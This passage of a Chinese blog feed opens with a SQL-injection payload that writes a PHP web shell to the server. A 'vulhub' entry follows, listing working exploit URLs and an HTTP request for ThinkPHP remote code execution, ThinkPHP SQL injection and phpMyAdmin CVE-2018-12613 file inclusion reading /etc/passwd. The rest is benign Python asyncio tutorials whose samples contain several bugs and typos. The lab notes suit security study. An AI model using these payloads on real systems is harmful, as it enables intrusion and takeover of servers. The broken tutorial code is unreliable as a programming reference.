<code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhub</title>
      <link href="/26813.html"/>
      <url>/26813.html</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h1><h2 id="ThinkPHP-2-x-任意代码执行漏洞"><a href="#ThinkPHP-2-x-任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x 任意代码执行漏洞"></a>ThinkPHP 2.x 任意代码执行漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo()</span><br></pre></td></tr></table></figure><h2 id="Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability"><a href="#Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability" class="headerlink" title="Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability"></a>Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability"><a href="#ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability" class="headerlink" title="ThinkPHP5 5.0.23 Remote Code Execution Vulnerability"></a>ThinkPHP5 5.0.23 Remote Code Execution Vulnerability</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP5-SQL-Injection-Vulnerability-Sensitive-Information-Disclosure-Vulnerability"><a href="#ThinkPHP5-SQL-Injection-Vulnerability-Sensitive-Information-Disclosure-Vulnerability" class="headerlink" title="ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability"></a>ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure><h2 id="phpmyadmin-4-8-1-Remote-File-Inclusion-Vulnerability-CVE-2018-12613"><a href="#phpmyadmin-4-8-1-Remote-File-Inclusion-Vulnerability-CVE-2018-12613" class="headerlink" title="phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)"></a>phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>异步协程-02</title>
      <link href="/60636.html"/>
      <url>/60636.html</url>
      
        <content type="html"><![CDATA[<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p><strong>死循环，检测代码并执行某些代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">任务列表 = [任务1，任务2，任务3...]</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">   可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有的任务，将&quot;可执行&quot;和&quot;已完成&quot;的任务返回</span><br><span class="line">   for 就绪任务 in 可执行的任务列表：</span><br><span class="line">      执行已就绪的任务</span><br><span class="line">   for 已完成的任务 in 已完成的任务列表：</span><br><span class="line">      再任务列表中移除 已完成任务</span><br><span class="line">   </span><br><span class="line">   如果任务列表中的任务都已完成，则终止循环</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p><strong>协程函数，定义函数为async def 函数名</strong><br><strong>协程对象，执行 协程函数() 得到的协程对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure><p><strong>注意：执行协程函数创建协程对象，函数内部代码不会执行</strong><br><strong>如果想要运行协程函数内部代码，必须要将协程对象交给事件循环来处理</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line"> </span><br><span class="line">result = func()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(result)</span><br><span class="line"><span class="comment"># asyncio.run(result )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="await关键字"><a href="#await关键字" class="headerlink" title="await关键字"></a>await关键字</h2><p><strong>await + 可等待对象（协程对象、Future、Task对象）-&gt; IO等待</strong><br><strong>一个协程函数中可以存在多个await</strong><br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;执行协程函数内部代码&quot;</span>)</span><br><span class="line">   response = <span class="keyword">await</span> others()</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;IO请求结束， 结果为：&quot;</span> + response)</span><br><span class="line"></span><br><span class="line">asyncio.run(func())</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">执行协程函数内部代码</span><br><span class="line">start</span><br><span class="line">----------停顿</span><br><span class="line">end </span><br><span class="line">IO请求结束，结果为：  返回值</span><br></pre></td></tr></table></figure><h2 id="task对象"><a href="#task对象" class="headerlink" title="task对象"></a>task对象</h2><p><strong>Tasks用于并发调度协程，通过asyncio.create_task(协程对象)的方式创建Tak对象，这样可以让协程加入事件循环中等待被调度执行。除了使用asyncio.create_task()函数以外，还可以用低层级的loop.create_task()或ensure_future()函数，不建议手动实例化Task对象。</strong></p><p><strong>示例1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 开始&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 创建Task对象，将当前执行func函数任务添加到事件循环中</span></span><br><span class="line">   </span><br><span class="line">   task1 = asyncio.create_task(func())</span><br><span class="line">   <span class="comment"># 创建Task对象，将当前执行func函数任务添加到事件循环中</span></span><br><span class="line">   task2 = asyncio.create_task(func())</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 结束&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 当执行某协程遇到IO操作时，会自动化切换执行其他任务</span></span><br><span class="line">   <span class="comment"># 此处的await是等待相应的协程全都执行完毕并获取结果</span></span><br><span class="line">   ret1 = <span class="keyword">await</span> task1</span><br><span class="line">   ret2 = <span class="keyword">await</span> task2</span><br><span class="line">   </span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main 开始</span><br><span class="line">main 结束</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">---------sleep(2秒)</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">返回值 返回值</span><br></pre></td></tr></table></figure><p><strong>示例2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 开始&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   task_list = [</span><br><span class="line">      asyncio.create_task(func(), name=<span class="string">&quot;task1&quot;</span>)</span><br><span class="line">      asyncio.create_task(func(), name=<span class="string">&quot;task2&quot;</span>)</span><br><span class="line">   ]</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 结束&quot;</span>)</span><br><span class="line">   done, pending = <span class="keyword">await</span> asyncio.wait(task_list)</span><br><span class="line">   <span class="built_in">print</span>(done)</span><br><span class="line">   </span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main 开始</span><br><span class="line">main 结束</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">--------sleep(2秒)</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">&#123;&lt;Task finished name=&#x27;task1&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;, &lt;Task finished name=&#x27;task2&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;&#125;</span><br></pre></td></tr></table></figure><h3 id="async-Future对象"><a href="#async-Future对象" class="headerlink" title="async Future对象"></a>async Future对象</h3><p><strong>Task对象继承Future，Task对象内部await结果的处理基于Future对象来的</strong></p><h3 id="concurrent-futures-Future对象"><a href="#concurrent-futures-Future对象" class="headerlink" title="concurrent.futures.Future对象"></a>concurrent.futures.Future对象</h3><p><strong>使用线程池、进程池实现异步操作时用到的对象</strong></p><h3 id="异步迭代器"><a href="#异步迭代器" class="headerlink" title="异步迭代器"></a>异步迭代器</h3><p><strong>略</strong></p><h3 id="异步上下文管理器"><a href="#异步上下文管理器" class="headerlink" title="异步上下文管理器"></a>异步上下文管理器</h3><p><strong>此种对象通过定义<code>__aenter__()</code>和<code>__aexit__()</code>方法来对<code>async_with</code>语句中的环境进行控制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AsyncContextManager</span>:</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">      self.conn = conn</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">do_something</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="comment"># 异步操作数据库</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__aenter__</span>(<span class="params">self</span>):</span><br><span class="line">      <span class="comment"># 异步连接数据库</span></span><br><span class="line">      self.conn = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">      <span class="keyword">return</span> self</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">__aexit__</span>(<span class="params">self, exc_type, exc, tb</span>):</span><br><span class="line">      <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> AsyncContextManager <span class="keyword">as</span> f:</span><br><span class="line">      result = <span class="keyword">await</span> f.do_something()</span><br><span class="line">      <span class="built_in">print</span>(result)</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">asyncio.run(func())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>异步协程-01</title>
      <link href="/60828.html"/>
      <url>/60828.html</url>
      
        <content type="html"><![CDATA[<h1 id="异步协程-class01"><a href="#异步协程-class01" class="headerlink" title="异步协程-class01"></a>异步协程-class01</h1><ul><li><strong>协程</strong></li><li><strong>asyncio模块进行异步编程</strong></li><li><strong>实战案例</strong></li></ul><h2 id="1-协程"><a href="#1-协程" class="headerlink" title="1.协程"></a>1.协程</h2><p><strong>协程不是计算机提供，程序员人为创造。</strong><br><strong>协程（Coroutine），也可以被称为微线程，是一种用户态内的上下文切换的技术，简而言之，其实就是通过一个线程实现代码块相互切换执行。</strong></p><p><strong>实现协程的方法</strong>:</p><ul><li>greenlet, 早期模块</li><li>yield关键字</li><li>asyncio装饰器（py3.4引入）</li><li>async、await关键字（py3.5）【推荐】</li></ul><h3 id="1-1-greenlet实现协程"><a href="#1-1-greenlet实现协程" class="headerlink" title="1.1 greenlet实现协程"></a>1.1 greenlet实现协程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)<span class="comment"># 第二步：输出1</span></span><br><span class="line">   gr2.switch()<span class="comment"># 第三步：切换到func2</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)<span class="comment"># 第六步：输出2</span></span><br><span class="line">   gr2.switch()<span class="comment"># 第七步：切换到func2</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>)<span class="comment"># 第四步：输出3</span></span><br><span class="line">   gr1.switch()<span class="comment"># 第五步：切换到func1</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="number">4</span>)<span class="comment"># 第八步：输出4</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">gr1 = greenlet(func1)</span><br><span class="line">gr2 = greenlet(func2)</span><br><span class="line"></span><br><span class="line">gr1.switch()<span class="comment"># 第一步：切换到func1</span></span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h3 id="1-2-yield关键字"><a href="#1-2-yield关键字" class="headerlink" title="1.2 yield关键字"></a>1.2 yield关键字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> func2()</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="number">3</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f1 = func1()</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> f1:</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="1-3-async、await关键字"><a href="#1-3-async、await关键字" class="headerlink" title="1.3 async、await关键字"></a>1.3 async、await关键字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">3</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">4</span>)</span><br><span class="line">   </span><br><span class="line">tasks = [</span><br><span class="line">   asyncio.ensure_future(func1()),</span><br><span class="line">   asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure><p>__注意：遇到IO阻塞自动切换<br><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">--------停顿</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="协程的意义"><a href="#协程的意义" class="headerlink" title="协程的意义"></a>协程的意义</h2><p><strong>在线程中如果遇到IO等待时间，线程可利用空闲时间干其他的事情</strong></p><h3 id="2-1-案例：下载三张图片"><a href="#2-1-案例：下载三张图片" class="headerlink" title="2.1 案例：下载三张图片"></a>2.1 案例：下载三张图片</h3><ul><li>普通方式<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">   name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">   res = requests.get(url)</span><br><span class="line">   <span class="keyword">with</span> <span class="built_in">open</span>(name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">      f.write(res.content)</span><br><span class="line">   <span class="built_in">print</span>(name + <span class="string">&quot;Finish.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__name__&quot;</span> == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   url_list = [</span><br><span class="line">    <span class="string">&quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;</span>,</span><br><span class="line">        <span class="string">&quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;</span></span><br><span class="line">]</span><br><span class="line">   start  = time.time()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> url_list:</span><br><span class="line">   download(i)</span><br><span class="line">   stop = time.time()</span><br><span class="line">   <span class="built_in">print</span>(stop - start)</span><br><span class="line">   </span><br></pre></td></tr></table></figure></li><li>协程方式<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">session, url</span>):</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">      content = response.content.read()</span><br><span class="line">      file_name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">      <span class="keyword">with</span> <span class="built_in">open</span>(file_name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(content)</span><br><span class="line">         <span class="built_in">print</span>(file_name + <span class="string">&quot; &quot;</span> +<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession <span class="keyword">as</span> session:</span><br><span class="line">      url_list = [</span><br><span class="line">            <span class="string">&quot;https://img-baofun.zhhainiao.com/pcwallpaper_ugc/preview/3760b2031ff41ca0bd80bc7a8a13f7bb_preview.mp4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://img-baofun.zhhainiao.com/market/97ba6b60662ab4f31ef06cdf5a5f8e94_preview.mp4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;https://wallpaperm.cmcm.com/scene/preview_video/750c4e56cb120056c9d155b63025c564_preview.mp4&quot;</span></span><br><span class="line">]</span><br><span class="line">      taaks = [asyncio.creat_task(download(session, url)) <span class="keyword">for</span> url <span class="keyword">in</span> url_list]</span><br><span class="line">      <span class="keyword">await</span> <span class="keyword">async</span>.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;__name__&quot;</span> == <span 